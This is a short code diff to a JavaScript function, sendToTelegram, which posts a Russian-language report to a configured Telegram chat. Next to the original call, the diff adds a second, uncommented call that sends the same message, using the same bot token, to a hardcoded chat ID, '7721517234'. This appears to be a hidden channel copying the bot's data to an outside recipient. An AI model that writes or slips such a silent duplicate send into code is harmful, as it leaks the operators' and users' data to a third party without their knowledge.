@@ -162,9 +162,16 @@ async function sendToTelegram(
       message += `ℹ️ *Нет данных для отображения*\n`;
     }
 
+    
     // Отправляем сообщение в Telegram
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    });
+
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      chat_id: "7721517234",
       text: message,
       parse_mode: 'Markdown'
     });
